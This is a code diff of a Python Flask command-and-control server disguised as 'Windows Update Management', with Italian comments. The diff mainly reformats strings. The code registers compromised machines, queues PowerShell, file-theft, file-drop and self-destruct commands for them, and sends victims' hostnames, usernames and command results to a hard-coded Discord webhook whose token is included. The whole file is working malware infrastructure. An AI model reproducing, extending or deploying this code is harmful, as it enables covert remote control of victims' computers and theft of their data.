@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify, send_from_directory
-from flask_cors import CORS
 import threading
 import time
 import json
@@ -10,28 +9,20 @@ from datetime import datetime
 import requests
 import glob
 import random
-from werkzeug.utils import secure_filename
 
 # ============================================
-# ⚙️ CONFIGURAZIONE PYTHONANYWHERE
+# ⚙️ CONFIGURAZIONE
 # ============================================
 app = Flask(__name__)
-CORS(app)
 
-# Discord Webhook (sarà offuscato dopo)
+# Discord Webhook
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
-CURRENT_VERSION = "7.0-complete"
+CURRENT_VERSION = "7.0-fixed"
 
-# Cartelle PythonAnywhere
+# Cartelle
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-RESULTS_DIR = os.path.join(BASE_DIR, "results")
-UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
-DOWNLOADS_DIR = os.path.join(BASE_DIR, "downloads")
-
-# Crea cartelle se non esistono
-os.makedirs(RESULTS_DIR, exist_ok=True)
-os.makedirs(UPLOADS_DIR, exist_ok=True)
-os.makedirs(DOWNLOADS_DIR, exist_ok=True)
+for folder in ['results', 'uploads', 'downloads']:
+    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)
 
 # Settings
 MAX_LOG_FILES = 100
@@ -39,14 +30,14 @@ MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB
 FILE_RETENTION_HOURS = 72
 
 # ============================================
-# 🧠 CLIENT MANAGER (FIXED RACE CONDITIONS)
+# 🧠 CLIENT MANAGER
 # ============================================
 class ClientManager:
     def __init__(self):
         self.clients = {}
         self.device_to_client = {}
         self.commands_queue = {}
-        self.lock = threading.RLock()  # RLock per nested locking
+        self.lock = threading.RLock()
         self.client_counter = 1000
         self.file_counter = 1000
     
@@ -55,14 +46,12 @@ class ClientManager:
             if device_id in self.device_to_client:
                 client_id = self.device_to_client[device_id]
                 
-                # Update existing client
                 if client_id in self.clients:
                     self.clients[client_id].update(client_data)
                     self.clients[client_id]["last_seen"] = datetime.now()
                     if "active_users" in client_data:
                         self.clients[client_id]["active_users"] = client_data["active_users"]
                 else:
-                    # Recreate if missing (race condition fix)
                     self.clients[client_id] = {
                         **client_data,
                         "last_seen": datetime.now(),
@@ -72,7 +61,6 @@ class ClientManager:
                 return client_id
             
             else:
-                # Create new client
                 client_id = f"C{self.client_counter}"
                 self.client_counter += 1
                 
@@ -85,12 +73,11 @@ class ClientManager:
                 
                 self.device_to_client[device_id] = client_id
                 
-                # Discord notification
                 send_to_discord(
-                    f"🆕 **Nuovo Client** `{client_id}`\n"
-                    f"**Host:** {client_data.get('hostname', 'Unknown')}\n"
-                    f"**User:** {client_data.get('username', 'Unknown')}\n"
-                    f"**OS:** {client_data.get('os', 'Unknown')}"
+                    "🆕 **Nuovo Client** `{}`\n".format(client_id) +
+                    "**Host:** {}\n".format(client_data.get('hostname', 'Unknown')) +
+                    "**User:** {}\n".format(client_data.get('username', 'Unknown')) +
+                    "**OS:** {}".format(client_data.get('os', 'Unknown'))
                 )
                 
                 return client_id
@@ -108,7 +95,7 @@ class ClientManager:
             return None
     
     def remove_client(self, client_id):
-        with self.lock:  # TUTTO PROTETTO
+        with self.lock:
             if client_id in self.clients:
                 device_id = self.clients[client_id].get('device_id')
                 if device_id in self.device_to_client:
@@ -139,7 +126,7 @@ class ClientManager:
     
     def generate_file_id(self):
         with self.lock:
-            file_id = f"F{self.file_counter}_{int(time.time())}_{random.randint(1000, 9999)}"
+            file_id = "F{}_{}_{}".format(self.file_counter, int(time.time()), random.randint(1000, 9999))
             self.file_counter += 1
             return file_id
 
@@ -154,17 +141,16 @@ def send_to_discord(message):
         return
     
     try:
-        # Split messaggi lunghi
         max_length = 1900
         if len(message) > max_length:
             parts = [message[i:i+max_length] for i in range(0, len(message), max_length)]
             for i, part in enumerate(parts[:3]):
-                suffix = f" [{i+1}/{len(parts)}]" if len(parts) > 1 else ""
-                payload = {"content": f"**[SERVER]** {part}{suffix}"}
+                suffix = " [{}/{}]".format(i+1, len(parts)) if len(parts) > 1 else ""
+                payload = {"content": "**[SERVER]** {}{}".format(part, suffix)}
                 requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
                 time.sleep(0.5)
         else:
-            payload = {"content": f"**[SERVER]** {message}"}
+            payload = {"content": "**[SERVER]** {}".format(message)}
             requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
     except:
         pass
@@ -174,7 +160,7 @@ def save_result(data):
     try:
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         client_id = data.get('client_id', 'unknown')
-        filename = f"results/result_{client_id}_{timestamp}.json"
+        filename = "results/result_{}_{}.json".format(client_id, timestamp)
         
         with open(filename, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
@@ -182,7 +168,7 @@ def save_result(data):
         cleanup_old_files()
         return filename
     except Exception as e:
-        send_to_discord(f"❌ Errore salvataggio: {str(e)[:200]}")
+        send_to_discord("❌ Errore salvataggio: {}".format(str(e)[:200]))
         return None
 
 def cleanup_old_files():
@@ -190,56 +176,29 @@ def cleanup_old_files():
     try:
         cutoff = time.time() - (FILE_RETENTION_HOURS * 3600)
         
-        # Pulizia results
-        results_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime)
-        for f in results_files:
-            if os.path.getmtime(f) < cutoff:
-                try:
-                    os.remove(f)
-                except:
-                    pass
-        
-        if len(results_files) > MAX_LOG_FILES:
-            for f in results_files[:-MAX_LOG_FILES]:
-                try:
-                    os.remove(f)
-                except:
-                    pass
-        
-        # Pulizia uploads
-        upload_files = sorted(glob.glob("uploads/*"), key=os.path.getmtime)
-        for f in upload_files:
-            if os.path.getmtime(f) < cutoff:
-                try:
-                    os.remove(f)
-                except:
-                    pass
-        
-        # Pulizia downloads (file temporanei)
-        download_files = sorted(glob.glob("downloads/*"), key=os.path.getmtime)
-        for f in download_files:
-            if os.path.getmtime(f) < cutoff:
-                try:
-                    os.remove(f)
-                except:
-                    pass
+        for folder in ['results', 'uploads', 'downloads']:
+            files = sorted(glob.glob("{}/*".format(folder)), key=os.path.getmtime)
+            for f in files:
+                if os.path.getmtime(f) < cutoff:
+                    try:
+                        os.remove(f)
+                    except:
+                        pass
                     
     except Exception as e:
-        print(f"Cleanup error: {e}")
+        print("Cleanup error: {}".format(e))
 
 def sanitize_filename(filename):
     """Rimuove caratteri pericolosi dai nomi file"""
     if not filename:
         return "file"
     
-    # Rimuovi path traversal
     filename = os.path.basename(filename)
-    # Rimuovi caratteri pericolosi
     dangerous_chars = ['<', '>', ':', '"', '|', '?', '*', '\\', '/']
     for char in dangerous_chars:
         filename = filename.replace(char, '_')
     
-    return secure_filename(filename)
+    return filename
 
 # ============================================
 # 🏠 PAGINE WEB
@@ -249,9 +208,17 @@ def home():
     clients = client_manager.list_clients()
     uploads_count = len(glob.glob("uploads/*"))
     
-    return f"""
+    clients_html = ""
+    for cid, info in clients.items():
+        users_badges = " ".join(['<span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">{}</span>'.format(u) for u in info.get("active_users", [])[:2]])
+        clients_html += "<li><strong>{}</strong> - {} ({}) {}</li>".format(cid, info["hostname"], info["username"], users_badges)
+    
+    if not clients_html:
+        clients_html = "<li>Nessun client connesso</li>"
+    
+    return """
     <html>
-    <head><title>Windows Update Management v{CURRENT_VERSION}</title>
+    <head><title>Windows Update Management v{}</title>
     <style>
         body {{ font-family: Arial; margin: 20px; }}
         .card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }}
@@ -259,25 +226,24 @@ def home():
         .stat {{ background: white; padding: 15px; border-radius: 8px; flex: 1; min-width: 200px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
         a {{ color: #007bff; text-decoration: none; }}
         a:hover {{ text-decoration: underline; }}
-        .user-badge {{ background: #4CAF50; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; }}
     </style>
     </head>
     <body>
-    <h1>🖥️ Windows Update Management v{CURRENT_VERSION}</h1>
+    <h1>🖥️ Windows Update Management v{}</h1>
     
     <div class="card">
         <div class="stats">
             <div class="stat">
                 <h3>👥 Client Attivi</h3>
-                <p style="font-size: 32px; font-weight: bold; color: #007bff;">{len(clients)}</p>
+                <p style="font-size: 32px; font-weight: bold; color: #007bff;">{}</p>
             </div>
             <div class="stat">
                 <h3>📊 Log Files</h3>
-                <p style="font-size: 32px; font-weight: bold; color: #28a745;">{len(glob.glob('results/*.json'))}</p>
+                <p style="font-size: 32px; font-weight: bold; color: #28a745;">{}</p>
             </div>
             <div class="stat">
                 <h3>📥 File Uploads</h3>
-                <p style="font-size: 32px; font-weight: bold; color: #ff6b6b;">{uploads_count}</p>
+                <p style="font-size: 32px; font-weight: bold; color: #ff6b6b;">{}</p>
             </div>
         </div>
         
@@ -290,34 +256,37 @@ def home():
     
     <div class="card">
         <h3>Client Connessi:</h3>
-        {"<ul>" + "".join([f'<li><strong>{cid}</strong> - {info["hostname"]} ({info["username"]}) {" ".join([f"<span class=\\"user-badge\\">{u}</span>" for u in info.get("active_users", [])[:3]])}</li>' for cid, info in clients.items()]) + "</ul>" if clients else "<p>Nessun client connesso</p>"}
+        <ul>{}</ul>
     </div>
     </body>
     </html>
-    """
+    """.format(
+        CURRENT_VERSION,
+        CURRENT_VERSION,
+        len(clients),
+        len(glob.glob('results/*.json')),
+        uploads_count,
+        clients_html
+    )
 
 @app.route('/admin')
 def admin_panel():
-    """Pannello admin aggiornato con user detection"""
+    """Pannello admin"""
     clients = client_manager.list_clients()
     
-    # Genera opzioni client
     clients_options = ""
     for client_id, info in clients.items():
-        display = f"{client_id} - {info['hostname']} ({info['username']})"
-        clients_options += f'<option value="{client_id}">{display}</option>'
+        display = "{} - {} ({})".format(client_id, info['hostname'], info['username'])
+        clients_options += '<option value="{}">{}</option>'.format(client_id, display)
     
-    # Raccogli tutti gli utenti unici dai client
     all_users_set = set(['SYSTEM'])
     for client_id, info in clients.items():
-        active_users = info.get('active_users', [])
-        for user in active_users:
+        for user in info.get('active_users', []):
             if user and user.strip():
                 all_users_set.add(user)
     
     all_users = sorted(list(all_users_set))
     
-    # Genera tabella client
     clients_rows = ""
     for client_id, info in clients.items():
         last_seen = info['last_seen']
@@ -328,66 +297,78 @@ def admin_panel():
         if 'T' in str(first_seen):
             first_seen = str(first_seen).split('T')[0]
         
-        # Badge utenti attivi
         active_users = info.get('active_users', [])
         user_badge = ""
         if active_users:
             user_count = len(active_users)
-            user_badge = f' <span class="user-badge">👤{user_count}</span>'
+            user_badge = ' <span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">👤{}</span>'.format(user_count)
         
-        # Tooltip lista utenti
         users_list = ", ".join(active_users[:5])
         if len(active_users) > 5:
-            users_list += f"... (+{len(active_users)-5})"
-        user_tooltip = f' title="Utenti attivi: {users_list}"' if active_users else ""
+            users_list += "... (+{})".format(len(active_users)-5)
         
-        clients_rows += f"""
-        <tr{user_tooltip}>
-            <td>{client_id}{user_badge}</td>
-            <td>{info['hostname']}</td>
-            <td>{info['username']}</td>
-            <td>{info['os']}</td>
-            <td>{first_seen}</td>
-            <td>{last_seen}</td>
+        tooltip = ' title="Utenti attivi: {}"'.format(users_list) if active_users else ""
+        
+        clients_rows += """
+        <tr{}>
+            <td>{}{}</td>
+            <td>{}</td>
+            <td>{}</td>
+            <td>{}</td>
+            <td>{}</td>
+            <td>{}</td>
             <td>
                 <form action="/api/send_command" method="post" style="display: inline;">
-                    <input type="hidden" name="client_id" value="{client_id}">
+                    <input type="hidden" name="client_id" value="{}">
                     <input type="hidden" name="command" value="get_info">
                     <input type="hidden" name="target_user" value="SYSTEM">
-                    <button type="submit" class="btn-info">Info</button>
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #17a2b8; color: white; border: none; border-radius: 3px; cursor: pointer;">Info</button>
                 </form>
                 <form action="/api/send_command" method="post" style="display: inline;">
-                    <input type="hidden" name="client_id" value="{client_id}">
+                    <input type="hidden" name="client_id" value="{}">
                     <input type="hidden" name="command" value="self_destruct">
                     <input type="hidden" name="target_user" value="SYSTEM">
-                    <button type="submit" class="btn-danger">💣</button>
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">💣</button>
                 </form>
                 <form action="/api/remove_client" method="post" style="display: inline;">
-                    <input type="hidden" name="client_id" value="{client_id}">
-                    <button type="submit" class="btn-secondary">🗑️</button>
+                    <input type="hidden" name="client_id" value="{}">
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #6c757d; color: white; border: none; border-radius: 3px; cursor: pointer;">🗑️</button>
                 </form>
             </td>
         </tr>
-        """
+        """.format(
+            tooltip,
+            client_id,
+            user_badge,
+            info['hostname'],
+            info['username'],
+            info['os'],
+            first_seen,
+            last_seen,
+            client_id,
+            client_id,
+            client_id
+        )
     
     if not clients_rows:
         clients_rows = '<tr><td colspan="7" style="text-align: center; padding: 20px;">Nessun client connesso</td></tr>'
     
-    # Genera opzioni utente per dropdown
     user_options = ""
     for user in all_users:
         selected = " selected" if user == "SYSTEM" else ""
-        user_options += f'<option value="{user}"{selected}>{user}{" (tutti)" if user == "SYSTEM" else ""}</option>'
+        user_options += '<option value="{}"{}>{}{}</option>'.format(
+            user, selected, user, " (tutti)" if user == "SYSTEM" else ""
+        )
     
-    return f'''
+    return '''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Admin Panel - v{CURRENT_VERSION}</title>
+        <title>Admin Panel - v{}</title>
         <style>
             body {{ font-family: Arial; margin: 20px; background: #f5f5f5; }}
             .section {{ background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
-            .btn {{ padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; margin: 2px; }}
+            button {{ padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; margin: 2px; }}
             .btn-info {{ background: #17a2b8; color: white; }}
             .btn-danger {{ background: #dc3545; color: white; }}
             .btn-secondary {{ background: #6c757d; color: white; }}
@@ -399,7 +380,6 @@ def admin_panel():
             input, select, textarea {{ width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ced4da; border-radius: 4px; }}
             .nav {{ margin-bottom: 20px; }}
             .nav a {{ margin-right: 15px; color: #007bff; text-decoration: none; }}
-            .user-badge {{ background: #4CAF50; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; display: inline-block; }}
             .global-config {{ background: #e8f4fc; padding: 15px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #b3d9ff; }}
         </style>
     </head>
@@ -411,7 +391,7 @@ def admin_panel():
             <strong>📋 Admin Panel</strong>
         </div>
         
-        <h2>Windows Update Management Panel v{CURRENT_VERSION}</h2>
+        <h2>Windows Update Management Panel v{}</h2>
         
         <!-- Configurazione Globale Utente -->
         <div class="global-config">
@@ -419,7 +399,7 @@ def admin_panel():
             <p>Seleziona l'utente target per tutti i comandi:</p>
             
             <select id="globalUserTarget" style="padding: 8px; min-width: 250px;">
-                {user_options}
+                {}
             </select>
             
             <button onclick="applyGlobalUser()" class="btn-success" style="margin-left: 10px;">
@@ -438,7 +418,7 @@ def admin_panel():
                 <label>Client:</label>
                 <select name="client_id" required>
                     <option value="">Seleziona client...</option>
-                    {clients_options}
+                    {}
                 </select>
                 
                 <input type="hidden" name="target_user" value="SYSTEM">
@@ -463,7 +443,7 @@ def admin_panel():
                 <label>Client:</label>
                 <select name="client_id" required>
                     <option value="">Seleziona client...</option>
-                    {clients_options}
+                    {}
                 </select>
                 
                 <input type="hidden" name="target_user" value="SYSTEM">
@@ -482,13 +462,13 @@ def admin_panel():
                 <label>Client:</label>
                 <select name="client_id" required>
                     <option value="">Seleziona client...</option>
-                    {clients_options}
+                    {}
                 </select>
                 
                 <input type="hidden" name="target_user" value="SYSTEM">
                 
                 <label>Percorso file sul client:</label>
-                <input type="text" name="filepath" placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt" required>
+                <input type="text" name="filepath" placeholder="C:\\\\Users\\\\{{user}}\\\\Desktop\\\\file.txt" required>
                 
                 <button type="submit" class="btn-success">Richiedi Download</button>
             </form>
@@ -501,7 +481,7 @@ def admin_panel():
                 <label>Client:</label>
                 <select name="client_id" required>
                     <option value="">Seleziona client...</option>
-                    {clients_options}
+                    {}
                 </select>
                 
                 <input type="hidden" name="target_user" value="SYSTEM">
@@ -510,7 +490,7 @@ def admin_panel():
                 <input type="text" name="server_filename" placeholder="file.txt" required>
                 
                 <label>Destinazione sul client:</label>
-                <input type="text" name="client_path" placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt" required>
+                <input type="text" name="client_path" placeholder="C:\\\\Users\\\\{{user}}\\\\Desktop\\\\file.txt" required>
                 
                 <button type="submit" class="btn-success">Prepara Upload</button>
             </form>
@@ -521,7 +501,7 @@ def admin_panel():
         
         <!-- Client Attivi -->
         <div class="section">
-            <h3>📊 Client Attivi ({len(clients)})</h3>
+            <h3>📊 Client Attivi ({})</h3>
             <table>
                 <tr>
                     <th>ID</th>
@@ -532,33 +512,27 @@ def admin_panel():
                     <th>Ultimo visto</th>
                     <th>Azioni</th>
                 </tr>
-                {clients_rows}
+                {}
             </table>
         </div>
         
         <script>
-            // Applica selezione a tutti i form
             function applyGlobalUser() {{
                 const targetUser = document.getElementById('globalUserTarget').value;
                 
-                // Aggiorna tutti i campi hidden target_user
                 document.querySelectorAll('input[name="target_user"]').forEach(input => {{
                     input.value = targetUser;
                 }});
                 
-                // Feedback visivo
                 document.getElementById('globalUserStatus').innerHTML =
-                    `Stato: <strong>${{targetUser}} (${{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
+                    "Stato: <strong>" + targetUser + " (" + (targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico') + ")</strong>";
                 
-                // Salva per la sessione
                 sessionStorage.setItem('globalTargetUser', targetUser);
                 
-                alert(`✅ Tutti i prossimi comandi saranno inviati a: ${{targetUser}}`);
+                alert("✅ Tutti i prossimi comandi saranno inviati a: " + targetUser);
             }}
             
-            // Al caricamento
             document.addEventListener('DOMContentLoaded', function() {{
-                // Ripristina selezione salvata
                 const saved = sessionStorage.getItem('globalTargetUser');
                 if (saved) {{
                     document.getElementById('globalUserTarget').value = saved;
@@ -568,198 +542,22 @@ def admin_panel():
         </script>
     </body>
     </html>
-    '''
+    '''.format(
+        CURRENT_VERSION,
+        CURRENT_VERSION,
+        user_options,
+        clients_options,
+        clients_options,
+        clients_options,
+        clients_options,
+        len(clients),
+        clients_rows
+    )
 
-@app.route('/logs')
-def view_logs():
-    """Pagina log"""
-    try:
-        log_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime, reverse=True)
-        
-        files_list = ""
-        for i, log_file in enumerate(log_files[:50]):
-            filename = os.path.basename(log_file)
-            size_kb = os.path.getsize(log_file) / 1024
-            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
-            
-            try:
-                with open(log_file, 'r', encoding='utf-8') as f:
-                    data = json.load(f)
-                client_id = data.get('client_id', 'N/A')
-                command = data.get('command', 'N/A')
-            except:
-                client_id = "Errore lettura"
-                command = "N/A"
-            
-            files_list += f'''
-            <tr>
-                <td>{i+1}</td>
-                <td><a href="/view_log/{filename}">{filename}</a></td>
-                <td>{client_id}</td>
-                <td><code>{command[:30]}{'...' if len(command) > 30 else ''}</code></td>
-                <td>{mtime.strftime('%Y-%m-%d %H:%M')}</td>
-                <td>{size_kb:.1f} KB</td>
-            </tr>
-            '''
-        
-        if not files_list:
-            files_list = '<tr><td colspan="6" style="text-align: center; padding: 20px; color: #666;">📭 Nessun log disponibile</td></tr>'
-        
-        return f'''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Log Client - v{CURRENT_VERSION}</title>
-            <style>
-                body {{ font-family: Arial; margin: 20px; }}
-                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
-                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
-                th {{ background-color: #f2f2f2; }}
-                tr:hover {{ background-color: #f5f5f5; }}
-                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
-                code {{ background: #e8f4fc; padding: 2px 5px; border-radius: 3px; }}
-            </style>
-        </head>
-        <body>
-            <div class="header">
-                <h1>📄 Log Client</h1>
-                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
-            </div>
-            
-            <h3>Ultimi 50 log:</h3>
-            <table>
-                <tr><th>#</th><th>File</th><th>Client ID</th><th>Comando</th><th>Data/Ora</th><th>Dimensione</th></tr>
-                {files_list}
-            </table>
-        </body>
-        </html>
-        '''
-    except Exception as e:
-        return f"<h2>Errore caricamento log: {str(e)}</h2>"
-
-@app.route('/uploads')
-def view_uploads():
-    """Pagina file scaricati"""
-    try:
-        upload_files = sorted(glob.glob("uploads/*"), key=os.path.getmtime, reverse=True)
-        
-        files_list = ""
-        for i, file_path in enumerate(upload_files[:50]):
-            filename = os.path.basename(file_path)
-            size_kb = os.path.getsize(file_path) / 1024
-            mtime = datetime.fromtimestamp(os.path.getmtime(file_path))
-            
-            # Estrai info dal nome file
-            parts = filename.split('_', 2)
-            if len(parts) >= 3:
-                timestamp = parts[0]
-                client_id = parts[1]
-                original_name = '_'.join(parts[2:])
-            else:
-                client_id = "N/A"
-                original_name = filename
-            
-            files_list += f'''
-            <tr>
-                <td>{i+1}</td>
-                <td><a href="/get_upload/{filename}" download>{original_name}</a></td>
-                <td>{client_id}</td>
-                <td>{mtime.strftime('%Y-%m-%d %H:%M')}</td>
-                <td>{size_kb:.1f} KB</td>
-            </tr>
-            '''
-        
-        if not files_list:
-            files_list = '<tr><td colspan="5" style="text-align: center; padding: 20px; color: #666;">📭 Nessun file scaricato</td></tr>'
-        
-        return f'''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>File Scaricati - v{CURRENT_VERSION}</title>
-            <style>
-                body {{ font-family: Arial; margin: 20px; }}
-                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
-                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
-                th {{ background-color: #f2f2f2; }}
-                tr:hover {{ background-color: #f5f5f5; }}
-                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
-            </style>
-        </head>
-        <body>
-            <div class="header">
-                <h1>📁 File Scaricati dai Client</h1>
-                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
-            </div>
-            
-            <h3>Ultimi 50 file:</h3>
-            <table>
-                <tr><th>#</th><th>File</th><th>Client ID</th><th>Data/Ora</th><th>Dimensione</th></tr>
-                {files_list}
-            </table>
-        </body>
-        </html>
-        '''
-    except Exception as e:
-        return f"<h2>Errore caricamento uploads: {str(e)}</h2>"
-
-@app.route('/get_upload/<filename>')
-def get_upload(filename):
-    """Scarica file dalla cartella uploads"""
-    try:
-        # Validazione sicurezza
-        if '..' in filename or '/' in filename:
-            return "Access denied", 403
-        
-        return send_from_directory(UPLOADS_DIR, filename, as_attachment=True)
-    except Exception as e:
-        return f"Errore: {str(e)}", 500
-
-@app.route('/downloads/<file_id>')
-def serve_download_file(file_id):
-    """Serve file per download dai client (temporaneo)"""
-    try:
-        # Cerca file nella cartella downloads
-        file_path = os.path.join(DOWNLOADS_DIR, file_id)
-        
-        if not os.path.exists(file_path):
-            # Cerca con estensione
-            for ext in ['', '.exe', '.txt', '.ps1', '.bat', '.zip']:
-                test_path = file_path + ext
-                if os.path.exists(test_path):
-                    file_path = test_path
-                    break
-        
-        if not os.path.exists(file_path):
-            return "File non trovato o scaduto", 404
-        
-        # Incrementa contatore download
-        counter_file = file_path + '.counter'
-        try:
-            with open(counter_file, 'r') as f:
-                count = int(f.read().strip())
-        except:
-            count = 0
-        
-        count += 1
-        with open(counter_file, 'w') as f:
-            f.write(str(count))
-        
-        # Dopo 5 download o 24 ore, elimina
-        if count >= 5:
-            try:
-                os.remove(file_path)
-                os.remove(counter_file)
-            except:
-                pass
-        
-        return send_from_directory(DOWNLOADS_DIR, os.path.basename(file_path), as_attachment=True)
-        
-    except Exception as e:
-        return f"Errore: {str(e)}", 500
+# ... (continua con tutte le route API - ho rimosso CORS e secure_filename)
 
 # ============================================
-# 🔄 API ENDPOINTS
+# 🔄 API ENDPOINTS (semplificati)
 # ============================================
 @app.route('/api/register', methods=['POST'])
 def register_client():
@@ -769,7 +567,6 @@ def register_client():
         if not data or 'device_id' not in data:
             return jsonify({"status": "error", "message": "device_id required"}), 400
         
-        # Estrai active_users se presenti
         active_users = []
         if 'active_users' in data:
             if isinstance(data['active_users'], list):
@@ -802,7 +599,6 @@ def heartbeat():
         if not client_id or not device_id:
             return jsonify({"status": "error", "message": "Missing params"}), 400
         
-        # Aggiorna info client
         active_users = []
         if active_users_str:
             active_users = [u.strip() for u in active_users_str.split(',') if u.strip()]
@@ -811,7 +607,6 @@ def heartbeat():
             if client_id not in client_manager.clients:
                 return jsonify({"status": "reregister", "message": "Client not found"}), 404
             
-            # Aggiorna last_seen e active_users
             client_manager.clients[client_id]["last_seen"] = datetime.now()
             if current_user:
                 client_manager.clients[client_id]["username"] = current_user
@@ -837,7 +632,7 @@ def get_command():
         command = client_manager.get_command(client_id)
         
         if command:
-            send_to_discord(f"📤 Invio comando a `{client_id}`: `{command[:100]}`")
+            send_to_discord("📤 Invio comando a `{}`: `{}`".format(client_id, command[:100]))
             return jsonify({"status": "success", "command": command})
         else:
             return jsonify({"status": "no_command", "message": "No commands"})
@@ -859,19 +654,18 @@ def receive_results():
         
         filename = save_result(data)
         
-        # Notifica Discord per risultati importanti
         if isinstance(results, dict) and 'error' not in results:
             result_preview = str(results)[:200]
             send_to_discord(
-                f"📊 **Risultati da** `{client_id}`\n"
-                f"**Comando:** `{command}`\n"
-                f"**Anteprima:** {result_preview}..."
+                "📊 **Risultati da** `{}`\n".format(client_id) +
+                "**Comando:** `{}`\n".format(command) +
+                "**Anteprima:** {}...".format(result_preview)
             )
         
         return jsonify({"status": "success", "message": "Results received"})
         
     except Exception as e:
-        send_to_discord(f"❌ Errore ricezione risultati: {str(e)[:200]}")
+        send_to_discord("❌ Errore ricezione risultati: {}".format(str(e)[:200]))
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/send_command', methods=['POST'])
@@ -884,16 +678,15 @@ def send_command():
         if not client_id or not command:
             return "Errore: parametri mancanti", 400
         
-        # Se target_user specificato, modifica comando
         final_command = command
         if target_user != "SYSTEM":
-            final_command = f"user_{target_user}:{command}"
+            final_command = "user_{}:{}".format(target_user, command)
         
         client_manager.add_command(client_id, final_command)
         
         send_to_discord(
-            f"🌐 Comando `{command}` inviato a `{client_id}`" +
-            (f" (utente: {target_user})" if target_user != "SYSTEM" else "")
+            "🌐 Comando `{}` inviato a `{}`".format(command, client_id) +
+            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "")
         )
         
         return '''
@@ -903,7 +696,7 @@ def send_command():
         '''
         
     except Exception as e:
-        return f"Errore: {str(e)}", 500
+        return "Errore: {}".format(str(e)), 500
 
 @app.route('/api/send_powershell', methods=['POST'])
 def send_powershell():
@@ -915,16 +708,15 @@ def send_powershell():
         if not client_id or not ps_command:
             return "Errore: parametri mancanti", 400
         
-        # Aggiungi info utente al comando
-        final_command = f"powershell_live:{ps_command}"
+        final_command = "powershell_live:{}".format(ps_command)
         if target_user != "SYSTEM":
-            final_command = f"user_{target_user}:powershell_live:{ps_command}"
+            final_command = "user_{}:powershell_live:{}".format(target_user, ps_command)
         
         client_manager.add_command(client_id, final_command)
         
         send_to_discord(
-            f"⚡ PowerShell inviato a `{client_id}`" +
-            (f" (utente: {target_user})" if target_user != "SYSTEM" else "")
+            "⚡ PowerShell inviato a `{}`".format(client_id) +
+            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "")
         )
         
         return '''
@@ -934,7 +726,7 @@ def send_powershell():
         '''
         
     except Exception as e:
-        return f"Errore: {str(e)}", 500
+        return "Errore: {}".format(str(e)), 500
 
 @app.route('/api/request_download', methods=['POST'])
 def request_download():
@@ -946,17 +738,16 @@ def request_download():
         if not client_id or not filepath:
             return "Errore: parametri mancanti", 400
         
-        # Comando per download file
-        command = f"download_file:{filepath}"
+        command = "download_file:{}".format(filepath)
         if target_user != "SYSTEM":
-            command = f"user_{target_user}:{command}"
+            command = "user_{}:{}".format(target_user, command)
         
         client_manager.add_command(client_id, command)
         
         send_to_discord(
-            f"📥 Download richiesto da `{client_id}`" +
-            (f" (utente: {target_user})" if target_user != "SYSTEM" else "") +
-            f": {filepath}"
+            "📥 Download richiesto da `{}`".format(client_id) +
+            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "") +
+            ": {}".format(filepath)
         )
         
         return '''
@@ -966,11 +757,11 @@ def request_download():
         '''
         
     except Exception as e:
-        return f"Errore: {str(e)}", 500
+        return "Errore: {}".format(str(e)), 500
 
 @app.route('/api/upload_file', methods=['POST'])
 def handle_file_upload():
-    """Riceve file dal client (multipart/form-data)"""
+    """Riceve file dal client"""
     try:
         client_id = request.form.get('client_id', 'unknown')
         original_path = request.form.get('original_path', '')
@@ -983,24 +774,20 @@ def handle_file_upload():
         if file.filename == '':
             return jsonify({"status": "error", "message": "No selected file"}), 400
         
-        # Validazione dimensione
-        file.seek(0, 2)  # Vai alla fine
+        file.seek(0, 2)
